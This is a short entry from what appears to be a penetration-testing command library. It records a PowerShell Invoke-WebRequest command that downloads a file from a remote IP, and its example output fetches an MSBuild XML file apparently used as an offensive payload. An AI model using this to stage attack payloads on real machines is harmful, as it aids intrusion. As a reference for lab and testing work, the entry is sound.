---
id: c2beffac-f04f-4286-a2de-40665be6f080
name: Invoke-WebRequest Download a File from a Web Server
type: command
executor: powershell
data: Invoke-WebRequest -Uri http://$_REMOTE_IP/$_FILENAME -Outfile $_FILENAME
output: PS C:\> Invoke-WebRequest -uri 10.10.14.45/msbuild_nps.xml -Outfile msbuild_nps.xml
created_at: '2019-11-14T23:38:41.555233+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Invoke-WebRequest Download a File from a Web Server

```powershell
Invoke-WebRequest -Uri http://$_REMOTE_IP/$_FILENAME -Outfile $_FILENAME
```

## Expected Output

```
PS C:\> Invoke-WebRequest -uri 10.10.14.45/msbuild_nps.xml -Outfile msbuild_nps.xml
```


